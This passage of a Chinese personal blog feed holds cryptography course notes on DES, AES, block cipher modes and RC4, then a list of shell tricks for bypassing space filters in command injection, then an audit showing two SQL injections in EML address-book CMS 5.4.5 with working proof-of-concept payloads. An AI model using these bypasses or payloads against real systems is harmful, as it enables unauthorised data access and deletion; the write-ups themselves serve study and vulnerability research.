K1。</li><li>当64 bit密文作为明文输入时，解密过程的第1轮迭代使用子密钥K16，第2轮迭代使用子密钥K15，…，第16轮迭代使用子密钥K1，结果输出得到64 bit明文。</li></ul><p>56位密钥的使用：</p><p>在DES成为标准时，采用的密钥是56 bit，其密钥量仅为256约为1017个，难以抵抗穷举搜索攻击。</p><p>问题主要集中在算法中的8个S盒上。DES密码体制的安全性依赖于非线性的S盒。S盒设计的详细准则一直没有公开，致使许多密码学家怀疑S盒设计中可能包含陷门。</p><p>双重DES ：</p><p>针对DES有效密钥长度偏短等安全性问题，人们利用实现DES的现有软硬件，寻求使用DES的多重加密方案以增加密码体制的强度。实用中一般广泛采用的有二重和三重DES等几种形式。</p><h2 id="第四章-数学基础（略）"><a href="#第四章-数学基础（略）" class="headerlink" title="第四章 数学基础（略）"></a>第四章 数学基础（略）</h2><h2 id="第五章-AES"><a href="#第五章-AES" class="headerlink" title="第五章 AES"></a>第五章 AES</h2><p>AES应用实例：</p><ul><li>路由器</li><li>安卓</li><li>SIM卡</li></ul><h3 id="总体结构："><a href="#总体结构：" class="headerlink" title="总体结构："></a>总体结构：</h3><p>AES是一个迭代型分组密码：</p><ul><li>分组长度：可以独立地指定为128比特、192比特、256比特。</li><li>密钥长度：可以独立地指定为128比特、192比特、256比特。</li></ul><p>状态、种子密钥和轮数：</p><p>类似于明密文分组，算法的中间结果也分组，称中间结果的分组为状态，所有的操作都在状态上进行。</p><ul><li>状态可以用以字节为元素的矩阵表示，该矩阵有4行，列数记为Nb，Nb等于分组长度除以32。</li><li>种子密钥也用一个以字节为元素的矩阵表示，该矩阵有4行，列数记为Nk，Nk等于分组长度除以32。</li></ul><p>迭代的轮数记为Nr，Nr与Nb和Nk有关，Nr与Nb和Nk的关系如下表：</p><p><img src="/images/mima2/2-3.jpg" alt=""></p><h3 id="详细结构"><a href="#详细结构" class="headerlink" title="详细结构"></a>详细结构</h3><p>当Nk等于4时，整个算法由10轮组成。每轮由4个变换模块组成，分别是：</p><ol><li>字节代换（ByteSub）</li><li>行移位（ShiftRow）</li><li>列混合（MixColumn）</li><li>轮密钥加（AddRoundKey）</li></ol><p>最后一轮略有不同，没有列混合。</p><p><img src="/images/mima2/2-4.png" alt=""></p><p>加密过程：</p><ol><li>初始轮密钥加</li><li>Nr-1轮迭代</li><li>最后一轮变换</li></ol><h3 id="字节代替变换（ByteSub）"><a href="#字节代替变换（ByteSub）" class="headerlink" title="字节代替变换（ByteSub）"></a>字节代替变换（ByteSub）</h3><p>字节代换是非线形变换，独立地对状态的每个字节进行。代换表（即S-盒）是可逆的，由以下两个变换的合成得到：  </p><ol><li>首先，将字节看作GF(28)上的元素，映射到自己的乘法逆元，00映射到自己。</li><li>其次，对字节做如下的（GF(2)上的，可逆的）仿射变换：</li></ol><p><img src="/images/mima2/2-5.png" alt=""></p><h3 id="行移位变换（ShiftRow）"><a href="#行移位变换（ShiftRow）" class="headerlink" title="行移位变换（ShiftRow）"></a>行移位变换（ShiftRow）</h3><p>状态矩阵State中的每一行将以字节为单位，循环左移不同的位移量。</p><ul><li>第一行：保持不变</li><li>第二行：循环左移一个字节</li><li>第三行：循环左移两个字节</li><li>第四行：循环左移三个字节 </li></ul><h3 id="列混合变换（MixColumn）"><a href="#列混合变换（MixColumn）" class="headerlink" title="列混合变换（MixColumn）"></a>列混合变换（MixColumn）</h3><p>将State乘以一个固定的矩阵A。</p><h3 id="轮密钥加变换（AddRoundKey）"><a href="#轮密钥加变换（AddRoundKey）" class="headerlink" title="轮密钥加变换（AddRoundKey）"></a>轮密钥加变换（AddRoundKey）</h3><p>密钥加是将轮密钥Ki简单地与状态State进行逐比特异或。</p><h3 id="AES的密钥扩展"><a href="#AES的密钥扩展" class="headerlink" title="AES的密钥扩展"></a>AES的密钥扩展</h3><p>密钥扩展指从种子密钥得到轮密钥的过程，其基本原则如下： </p><ul><li>轮密钥的比特数等于分组长度乘以轮数加1：128 bit × (10+1) = 1408 bit</li><li>种子密钥被扩展成为扩展密钥（<strong>密钥扩展</strong>）。</li><li>轮密钥从扩展密钥中取，其中第1轮轮密钥取扩展密钥的前Nb个字，第2轮轮密钥取接下来的Nb个字，如此下去（<strong>轮密钥选取</strong>）。</li></ul><h3 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h3><p>将种子密钥扩展为扩展密钥的计算过程如下：</p><p><img src="/images/mima2/2-6.png" alt=""></p><p>当种子密钥长度为128bit时，Nk＝4：</p><p><code>temp = SubByte(RotByte(W[i-1])) Å Rcon[i/Nk]</code> </p><ul><li>RotByte( )：循环左移一个字节，如W=(a0, a1, a2, a3)，则RotByte(W)=(a1, a2, a3, a0)。</li><li>SubByte( )：S盒的字节代换。</li><li>Rcon[i]：轮常数</li></ul><p><img src="/images/mima2/2-7.png" alt=""></p><h3 id="AES的解密过程"><a href="#AES的解密过程" class="headerlink" title="AES的解密过程"></a>AES的解密过程</h3><p><strong>AES加密算法的每一步都可逆！</strong></p><h2 id="第6章-分组密码的工作模式"><a href="#第6章-分组密码的工作模式" class="headerlink" title="第6章  分组密码的工作模式"></a>第6章  分组密码的工作模式</h2><p>分组密码的工作模式：</p><blockquote><p>为了能在各种应用场合使用DES，1980年，美国在FIPSPUS 81中标准化了DES算法的四种工作模式，后来对AES算法研发过程中，增加了新的工作模式，这些模式适用于任何分组密码算法。</p></blockquote><p>五种常用的工作模式为:</p><p>1.电码本（Electronics Code Book，ECB）</p><p>2.密文分组链接（Cipher Block Chaining，CBC）</p><p>3.密文反馈（Cipher-FeedBack，CFB）</p><p>4.输出反馈（Output-FeedBack，OFB）</p><p>5.计数器（Counter，CTR）</p><p>为了方便描述，定义如下符号：</p><ul><li>Ek：分组密码加密算法</li><li>M1, M2, …, Mn：明文消息中n个连续的分组</li><li>C1,  C2,  …,  Cn：密文消息中n个连续的分组</li><li>IV：初始向量，是一个随机比特串</li><li>HSj(A)：A的j个最高有效位，例如HS8(0010101110100101)=00101011</li><li>LSj(A)：A中除了j个最高位外剩下的有效位，例如LS8(0010101110100101)=10100101</li><li>A||B：消息分组A和B的链接</li></ul><h3 id="电码本模式"><a href="#电码本模式" class="headerlink" title="电码本模式"></a>电码本模式</h3><p>电码本模式是分组密码的一个直接应用：它一次对一个明文分组Mi直接加密，每次的加密密钥k都相同。</p><p>当密钥k取定时，对明文的每一个分组Mi，都有一个惟一的密文分组Ci与之对应。ECB模式的加密过程为：</p><p><code>Ci=Ek(Mi)，i=1，2，…，n</code></p><ul><li><p>ECB模式的优点：当改变一个明文分组值的时候，仅仅会引起相应的密文分组取值发生变化，而其他密文分组不受影响。</p></li><li><p>ECB模式的缺点：相同的明文分组会产生相同的密文分组，易暴露明文的固有格式。因此ECB不适用于长消息，建议在大多数情况下不要使用ECB模式进行加密操作。</p></li></ul><h3 id="密文分组链接模式"><a href="#密文分组链接模式" class="headerlink" title="密文分组链接模式"></a>密文分组链接模式</h3><p>密码分组链接模式是用于普通数据加密的一种分组密码工作模式。CBC解决了ECB的安全缺陷，可以让重复的明文分组产生不同的密文分组。</p><p><code>C0=IV,</code><br><code>Ci=Ek(MiÅCi-1)，</code></p><p><code>i=1,2, …, n</code></p><ul><li><p>CBC模式的优点：CBC模式输出的是随机化的密文分组，CBC模式适用于较长的明文消息进行加密。</p></li><li><p>CBC模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p></li></ul><h3 id="密文反馈模式"><a href="#密文反馈模式" class="headerlink" title="密文反馈模式"></a>密文反馈模式</h3><p>设传送的每个单元（如一个字符）是j比特长，通常取j=8。以IV作为初始的b比特随机输入分组，存放于移位寄存器中。</p><p><code>I1= IV                            Ii=LSj(Ii-1)||Ci-1     (i=2,3,…,n)</code></p><p><code>O1=Ek(I1)                    Oi=Ek(Ii)          (i=2,3,…,n)</code></p><p><code>C1=M1ÅHSj(O1)         Ci=MiÅHSj(Oi)  (i=2,3,…,n)</code></p><ul><li><p>CFB模式的优点：随机化密文。</p></li><li><p>CFB模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p></li></ul><h3 id="输出反馈模式"><a href="#输出反馈模式" class="headerlink" title="输出反馈模式"></a>输出反馈模式</h3><p>输出反馈模式在结构上类似于CFB模式，两种模式的不同之处在于：</p><ul><li><p>OFB：将加密算法的输出反馈到移位寄存器</p></li><li><p>CFB：将密文单元反馈到移位寄存器</p></li></ul><h3 id="计数器模式"><a href="#计数器模式" class="headerlink" title="计数器模式"></a>计数器模式</h3><p>计数器模式要求计数器的长度与分组长度相同，它将计数器从初始值开始计数所得到的值作为分组加密算法的输入，经过加密算法变换后的结果与明文分组异或，得到密文分组。</p><p><code>Ci=MiÅE(Ctri)，i=1,2, …, n</code></p><ul><li>CRT模式的优点：<ul><li>可以处理任意长度的数据，而且加密-解密过程仅涉及加密运算，不涉及解密运算，因此不用实现解密算法。</li><li>能并行处理，即能同时对多个分组的加密-解密进行处理，而不必等到前面分组处理完才开始，而且可以提前进行预处理，这也可以极大地提高处理效率。</li><li>可以随机地对任意一个密文分组进行解密，对该密文分组的处理与其他密文无关。</li></ul></li></ul><p><img src="/images/mima2/2-8.jpg" alt=""></p><h2 id="第七章-伪随机数的产生和流密码"><a href="#第七章-伪随机数的产生和流密码" class="headerlink" title="第七章 伪随机数的产生和流密码"></a>第七章 伪随机数的产生和流密码</h2><h3 id="随机数的使用"><a href="#随机数的使用" class="headerlink" title="随机数的使用"></a>随机数的使用</h3><p>大量密码算法或网络安全协议都需要随机数，如：</p><ul><li>密钥分发和认证</li><li>会话密钥的产生</li><li>RSA等公钥密码算法</li><li>对称密码的密钥 </li></ul><p>现实中的随机数：</p><ul><li>手机动态验证码</li><li>动态验证码</li><li>密码器</li></ul><h3 id="随机数的使用-1"><a href="#随机数的使用-1" class="headerlink" title="随机数的使用"></a>随机数的使用</h3><p>这些应用对随机数序列产生提出了两个不同的要求：随机性和不可预测性。 </p><ul><li>随机性<ul><li>分布均匀性：能通过均匀性检验、独立性检验、游程检验等基本的统计特性检验。</li><li>独立性：序列中任何子序列不能由其他子序列推导出。</li></ul></li><li>不可预测性<ul><li>指即使给出产生序列的硬件和所有以前产生的序列的全部知识，也不可能预测下一个随机位是什么。因此，随机序列是非周期的。</li></ul></li></ul><h3 id="伪随机数发生器"><a href="#伪随机数发生器" class="headerlink" title="伪随机数发生器"></a>伪随机数发生器</h3><ul><li>物理方法：利用自然界的一些真的随机物理量，如放射性衰变、宇宙射线的触发时间等。</li><li>计算机产生（数学方法）：由一个初始状态（称为“种子”）开始，通过一个确定的算法来生成。一旦给定算法和种子值，输出序列就是确定的了，因此有一定的周期性，规律性和重复性，不是真正的随机数，通常称之为伪随机数。产生伪随机数的算法或硬件一般称为伪随机数发生器。</li></ul><h3 id="BBS发生器"><a href="#BBS发生器" class="headerlink" title="BBS发生器"></a>BBS发生器</h3><p>BBS（Blum-Blum-Shub）产生器是可证明安全的伪随机比特序列产生器。</p><p>首先选择两个大素数p和q，满足</p><p><code>p ≡ q ≡ 3 (mod 4)</code></p><p>令n = pq。再选一随机数s，使得s与n互素。</p><p>BBS产生器产生伪随机序列的算法如下：</p><p>​                       <code>X0 = s2 mod n</code></p><p>​                       for i = 1 to ∞ do {</p><p>​              Xi = X2i-1 mod n;</p><p>​              R</p><p><code>i</code></p><p> = X</p><p><code>i</code></p><p> <code>mod 2 }</code></p><h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><p>流密码结构图：</p><p><img src="/images/mima2/2-9.png" alt=""></p><h3 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h3><p>RC4是MIT的Rivest开发的，是使用最为广泛的流密码算法之一。</p><ul><li>RC4的大小由参数n确定。对于一个n位长的字（或0, 1 序列），有2n种不同的排列方式，对应2n个不同的元素（或状态），这些元素组成一个长为2n的数组S。</li><li>RC4每次随机选取数组S中的一个元素输出作为密钥k。</li></ul><p>RC4包含了两个算法：</p><p>1.密钥调度算法（Key Scheduling Algorithm, KSA）：设置数组S的初始排序。</p><p>2.伪随机生成算法（Pseud Random Generation Algorithm, PRGA）：随机选取元素作为密钥k输出并修改数组S的原始排序，每产生一个密钥k，数组S就被重新排列一次。</p><p>KSA算法：</p><ul><li>常用的RC4的n=8，此时，RC4可以生成28=256个元素的数组S。KSA初始化S，取</li></ul><p>S[i]=i (i=0, 1, …, 255) </p><ul><li><p>选择0到255之间的一个子序列作为密钥，填充到密钥数组K[i]=i(i=0, 1, …, 255)中。填充时，这个密钥不断地重复直到填满整个密钥数组。</p></li><li><p>然后利用以下算法实现数组S的初始随机化排列。</p></li></ul><p>​       <code>j=0;</code></p><p>​      for i=0 to 255 do</p><p>​       j=j+S[i]+K[i] (mod 256);</p><p>​      <code>swap (S[i], S[j]);</code></p><p>PRGA算法：</p><p>在KSA将数组S进行初始排序的基础上，PRGA从数组S中随机选取元素作为密钥流字节，同时修改S的排序，以便于下一次密钥流的选取。</p><p> 选取过程取决于索引i和j，这两个索引都从0开始，选取时重复执行以下算法，直到产生与明文的长度相等的密钥流。</p><p>​                <code>i=i+1 (mod 256);</code></p><p>​                j=j+S[i] (mod 256);</p><p>​                swap (S[i], S[j]);</p><p>​                t=S[i]+S[j] (mod 256);</p><p>​                k=S[t];</p><p>​                <code>output k=S[t];</code> </p><p> 从算法中可以看出，索引i保证每个元素的改变，索引j保证元素改变的随机性。</p><blockquote><p>RC4的优点是在软件容易实现且运行速度快。RC4广泛用于商业密码产品中，如用于属于IEEE<br>802.11无线LAN标准的WEP协议和更新的WiFi保护访问协议等。目前所用的初始密钥一般至少为128<br>位。</p><p>关于分析RC4的攻击方法有许多公开发表的文献。但是当密钥长度很大时，比如128位，没有那种攻击方法有效。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第三章-分组密码和数据加密标准（DES）&quot;&gt;&lt;a href=&quot;#第三章-分组密码和数据加密标准（DES）&quot; class=&quot;headerlink&quot; title=&quot;第三章 分组密码和数据加密标准（DES）&quot;&gt;&lt;/a&gt;第三章 分组密码和数据加密标准（DES）&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>密码学基础笔记(一)</title>
    <link href="http://yoursite.com/2019/01/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/01/07/密码学基础笔记(一)/</id>
    <published>2019-01-07T04:54:30.169Z</published>
    <updated>2019-01-26T08:32:18.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到第一学期开了密码学这门课，本来想好好学一下的，没想到计划赶不上变化居然忙到根本没有时间上课，希望不会挂掉（哭。。。</p><h2 id="第一章-概览"><a href="#第一章-概览" class="headerlink" title="第一章 概览"></a>第一章 概览</h2><h3 id="计算机安全概念"><a href="#计算机安全概念" class="headerlink" title="计算机安全概念"></a>计算机安全概念</h3><p>定义：</p><blockquote><p>“对于一个自动化的信息系统，采取保护措施确保信息系统资源（包括硬件、软件、固件、信息/数据和通信）的保密性、完整性、可用性。”</p></blockquote><p>3个关键目标（CIA）：</p><ul><li>保密性（Confidentiality）<ul><li>数据保密性</li><li>隐私性</li></ul></li><li>完整性（Integrity）<ul><li>数据完整性</li><li>系统完整性</li></ul></li><li>可用性（Availability）</li></ul><p>其他概念：</p><ul><li>真实性（Authenticity）</li><li>可追溯性（Accountability）</li></ul><h3 id="OSI安全框架"><a href="#OSI安全框架" class="headerlink" title="OSI安全框架"></a>OSI安全框架</h3><p>主要关注：</p><ul><li><p>安全攻击</p><ul><li>被动攻击<ul><li>信息内容的泄露</li><li>流量分析</li></ul></li><li>主动攻击<ul><li>伪装</li><li>重播</li><li>消息修改</li><li>拒绝服务</li></ul></li></ul></li><li>安全机制<ul><li>特定安全机制：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证。</li><li>普遍安全机制：可信功能、安全标签、事件检测、安全审计跟踪、安全恢复。</li></ul></li><li>安全服务<ul><li>认证</li><li>访问控制</li><li>数据保密性</li><li>数据完整性</li><li>不可否认性</li></ul></li></ul><blockquote><p>是一种由系统提供的对系统资源进行特殊保护的处理或通信服务。(RFC4949)</p></blockquote><h3 id="网络安全模型"><a href="#网络安全模型" class="headerlink" title="网络安全模型"></a>网络安全模型</h3><p><img src="/images/网络安全模型.png" alt=""></p><p>可信第三方：</p><ul><li>第三方负责将秘密信息分配给通信双方，而对攻击者保密。</li><li>或者当通信双方关于信息传输的真实性发生争执时，由第三方来仲裁。</li></ul><p>安全服务：</p><ol><li>设计算法</li><li>产生秘密信息</li><li>分配和共享</li><li>指明协议实现安全服务</li></ol><h2 id="第二章-传统加密技术"><a href="#第二章-传统加密技术" class="headerlink" title="第二章 传统加密技术"></a>第二章 传统加密技术</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li><p>密码学</p><ul><li>密码编码学</li><li>密码分析学</li></ul></li><li><p>明文：原始的消息</p></li><li>密文： 加密后的消息</li><li>加密：从明文到密文的变换过程</li><li>解密：从密文到明文的变换过程</li></ul><h3 id="对称密码模型"><a href="#对称密码模型" class="headerlink" title="对称密码模型"></a>对称密码模型</h3><p>5个基本成分：</p><ul><li>明文</li><li>加密算法</li><li>密钥</li><li>密文</li><li>解密算法</li></ul><p><img src="/images/对称密码模型.png" alt="">     </p><ul><li><p>加密算法根据输入信息X和密钥K生成密文Y=[Y1, Y2, …, YN]，即Y=E[K, X]。</p></li><li><p>有密钥K的合法接收者，可进行解密变换X=D[K, Y]。</p></li></ul><p><img src="/images/对称密码体制.png" alt=""></p><h3 id="密码编码学"><a href="#密码编码学" class="headerlink" title="密码编码学"></a>密码编码学</h3><p>3个独立特征：</p><ol><li>转换明文为密文的运算类型：代替 vs. 置换。</li><li>所用的密钥数：对称密码 vs. 公钥密码。</li><li>处理明文的方法：分组密码 vs. 流密码。</li></ol><h3 id="密码分析学和穷举攻击"><a href="#密码分析学和穷举攻击" class="headerlink" title="密码分析学和穷举攻击"></a>密码分析学和穷举攻击</h3><p>攻击通用方法：</p><ul><li>密码分析学</li><li>穷举攻击</li></ul><blockquote><p>Kerckhoffs原则：假定密码攻击者知道加密数据所使用的算法，数据的安全性应当取决于密钥的选择。</p><p>​    <strong>无条件安全</strong>：无论花多少时间，攻击者都无法解密密文。</p><p>​    Shannon已经证明：除了一次一密之外，所有的加密算法都不会是无条件安全的。</p></blockquote><p>加密算法应尽量满足：</p><ul><li><p>破译密码的<strong>代价</strong>超出密文信息的价值</p></li><li><p>破译密码的<strong>时间</strong>超出密文信息的有效生命期</p></li></ul><p>如果加密体制满足了上述两条标准中的任意一条，则它是<strong>计算安全</strong>的。然而，估计攻击者成功破译密文所需的工作量是非常困难的。</p><h3 id="代替技术"><a href="#代替技术" class="headerlink" title="代替技术"></a>代替技术</h3><p><strong>Caesar密码</strong>：</p><blockquote><p>对字母表中的每个字母，用它之后的第3个字母来代替</p></blockquote><p>细节：</p><ol><li>加密算法：Ek(m) ≡ m + 3 (mod 26)</li><li>解密算法：Dk(c) ≡ c - 3 (mod 26)</li></ol><blockquote><p>凯撒密码的密钥空间太小，穷举攻击25种可能</p></blockquote><p><strong>单表代替密码</strong>：</p><blockquote><p>Caesar密码只有25种可能的密钥，是不安全的。通过允许任意代替，密钥空间将会急剧增大。一般，具有n个元素的集合有n!个置换。如果密文是26个字母的任意置换，那么就有26!种可能的密钥。</p></blockquote><p><strong>Playfair密码</strong>：</p><p>基于一个5×5的字母矩阵。字母矩阵构造方法如下：</p><ol><li>选一个英文短语或单词作为密钥，去掉其中重复的字母得到一个无重复字母的字符串。</li><li>然后再将字母表中剩下的字母依次从左到右、从上往下填入矩阵中，字母i，j占同一个位置。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;看到第一学期开了密码学这门课，本来想好好学一下的，没想到计划赶不上变化居然忙到根本没有时间上课，希望不会挂掉（哭。。。&lt;/p&gt;
&lt;h2 id
      
    
    </summary>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Blank Bypass</title>
    <link href="http://yoursite.com/2018/11/15/Blank%20Bypass/"/>
    <id>http://yoursite.com/2018/11/15/Blank Bypass/</id>
    <published>2018-11-15T06:51:41.045Z</published>
    <updated>2018-11-15T10:02:13.099Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>cat&lt;1.txt</p><p><img src="/images/black1.PNG" alt=""></p></li><li><p>cat$IFS$91.txt</p><p><img src="/images/black2.PNG" alt=""></p></li><li><p>cat${IFS}1.txt</p><p><img src="/images/black3.PNG" alt=""></p></li><li><p>cat&lt;&gt;1.txt</p><p><img src="/images/black4.PNG" alt=""></p></li><li><p>{cat,1.txt}</p><p><img src="/images/black5.PNG" alt=""></p></li><li><p>CMD=$’\x201.txt’&amp;&amp;cat$CMD</p><p><img src="/images/black6.PNG" alt=""></p></li><li><p>CMD=$’\x0a1.txt’&amp;&amp;cat$CMD</p><p><img src="/images/black7.PNG" alt=""></p></li><li><p>CMD=$’\x091.txt’&amp;&amp;cat$CMD</p><p><img src="/images/black8.PNG" alt=""></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;cat&amp;lt;1.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/black1.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;cat$IFS$91.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/black2.PNG&quot; a
      
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>EML企业通讯录管理系统两处注入分析</title>
    <link href="http://yoursite.com/2018/08/12/EML%E4%BC%81%E4%B8%9A%E9%80%9A%E8%AE%AF%E5%BD%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%A4%E5%A4%84%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/</id>
    <published>2018-08-12T12:38:02.459Z</published>
    <updated>2018-08-13T01:31:17.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p><h1 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p><p>版本：5.4.5</p><p>官方网站：<a href="http://bbs.emlsoft.com" target="_blank" rel="external">http://bbs.emlsoft.com</a> </p><p>更新时间：2018.7.26 </p><p>测试环境：windows10+phpstudy+php5.5</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h3 id="过滤函数："><a href="#过滤函数：" class="headerlink" title="过滤函数："></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p><ol><li>系统过滤机制的正面bypass;</li><li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li></ol><p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p><p>/lib/func.class.php:(27-37行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//安全验证</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span><span class="params">(&amp;$svar)</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())&#123;</div><div class="line"><span class="keyword">if</span>( is_array($svar) )&#123;</div><div class="line"><span class="keyword">foreach</span>($svar <span class="keyword">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$svar = addslashes($svar);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $svar;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p><h3 id="第一处注入："><a href="#第一处注入：" class="headerlink" title="第一处注入："></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//设置分页</span></div><div class="line"><span class="keyword">if</span>($_POST[numPerPage]==<span class="string">""</span>)&#123;$numPerPage=<span class="string">"10"</span>;&#125;<span class="keyword">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</div><div class="line"><span class="keyword">if</span>($_GET[pageNum]==<span class="string">""</span>||$_GET[pageNum]==<span class="string">"0"</span> )&#123;$pageNum=<span class="string">"0"</span>;&#125;<span class="keyword">else</span>&#123;$pageNum=($_GET[pageNum]<span class="number">-1</span>)*$numPerPage;&#125;</div><div class="line">$num=mysql_query(<span class="string">"select * from eml_address_list where 1=1 $search"</span>);<span class="comment">//当前频道条数</span></div><div class="line">$total=mysql_num_rows($num);<span class="comment">//总条数</span></div><div class="line">$page=<span class="keyword">new</span> page(<span class="keyword">array</span>(<span class="string">'total'</span>=&gt;$total,<span class="string">'perpage'</span>=&gt;$numPerPage));</div><div class="line"></div><div class="line"><span class="comment">//查询</span></div><div class="line">$sql=<span class="string">"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage"</span>;</div></pre></td></tr></table></figure><p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p><p>后者位于limit中并且存在order by，(<a href="http://www.freebuf.com/articles/web/57528.html" target="_blank" rel="external">参考文章</a>)可使用如下利用方式。</p><p>POC：</p><p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p><p><img src="/images/sqli1.PNG" alt=""></p><h3 id="第二处注入："><a href="#第二处注入：" class="headerlink" title="第二处注入："></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//批量删除</span></div><div class="line"><span class="keyword">if</span>($do==<span class="string">"del_all"</span>)&#123;</div><div class="line">If_rabc($action,$do); <span class="comment">//检测权限</span></div><div class="line">is_admin($action,$do); <span class="comment">//检测权限</span></div><div class="line">$arr = $_POST[<span class="string">"item"</span>];</div><div class="line">$count_arr=count($arr); </div><div class="line"><span class="keyword">if</span>($count_arr==<span class="number">0</span>)&#123;</div><div class="line"><span class="keyword">echo</span> error($msg); </div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$str = implode(<span class="string">"','"</span>,$arr);<span class="comment">//拼接字符</span></div><div class="line"></div><div class="line">$sql = <span class="string">"delete from eml_address_list WHERE id in('&#123;$str&#125;')"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($db-&gt;query($sql))&#123;<span class="keyword">echo</span> success($msg,<span class="string">"?action=address"</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> error($msg);&#125;</div></pre></td></tr></table></figure><p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p><p>POC:</p><p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p><p><img src="/images/sqli2.PNG" alt=""></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么
      
    
    </summary>
    
    
